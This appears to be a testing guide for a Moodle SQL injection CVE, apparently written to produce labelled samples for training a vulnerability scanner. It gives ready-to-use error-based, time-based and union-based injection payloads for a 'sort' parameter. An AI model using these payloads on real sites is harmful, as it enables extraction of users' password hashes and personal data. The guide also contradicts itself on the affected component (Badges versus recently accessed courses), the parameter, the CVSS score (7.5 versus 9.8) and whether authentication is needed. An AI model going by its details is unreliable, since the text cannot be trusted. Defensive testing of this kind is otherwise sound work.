# CVE-2021-36393: SQL Injection in Badges - Testing Guide

## 📋 CVE Information

**CVE ID:** CVE-2021-36393  
**Severity:** High (CVSS 7.5)  
**Type:** SQL Injection  
**Component:** Badges module  
**Affected Versions:** Moodle < 3.9.8, < 3.10.5, < 3.11.1  
**Fixed in:** 3.9.8, 3.10.5, 3.11.1  

**Description:**  
SQL injection vulnerability in the badges component allows authenticated users to inject malicious SQL via the badge ID parameter.

**Reference:**  
- https://moodle.org/mod/forum/discuss.php?d=424802
- https://www.cvedetails.com/cve/CVE-2021-36393/

### STEP 3: Manual SQL Injection Test (15 minutes)

#### Test 1: Error-Based SQL Injection

**Payload (modify 'sort' parameter):**
```
sort=fullname' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x23,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
```

**Expected Result (Vulnerable):**
- ❌ SQL error revealing database name
- ❌ Error message in response

**Expected Result (Patched):**
- ✅ Normal sorting behavior
- ✅ No error leaked

#### Test 2: Time-Based Blind SQL Injection

**Payload:**
```
sort=fullname' AND SLEEP(5)--
```

**Expected Result (Vulnerable):**
- ❌ 5-second delay in response
- ❌ Confirms vulnerability without visible output

#### Test 3: Union-Based Data Extraction

**Payload:**
```
sort=fullname' UNION SELECT 1,user(),database(),version(),5--
```

**Expected Result (Vulnerable):**
- ❌ Database information in response
- ❌ Server version exposed

## 🔍 UNDERSTANDING THE VULNERABILITY

**Attack Vector:**
- Component: blocks/recentlyaccessedcourses/
- Parameter: `sort` (used for sorting course list)
- Injection Type: Error-based, Union-based, Time-based (blind)
- Required Privilege: Student role (minimal access)

**Why It's Critical (CVSS 9.8):**
- No authentication barrier (any logged-in user)
- Direct database access
- Can extract: usernames, password hashes, personal data
- High confidentiality + integrity impact

**Fix (Moodle 3.9.8+):**
- Parameterized queries implemented
- Input validation on sort parameter
- Whitelist of allowed sort columns

**ML Relevance:**
- Tests scanner ability to detect critical SQL injection
- High-severity TP sample for imbalanced dataset
- CVE-verified ground truth for model training
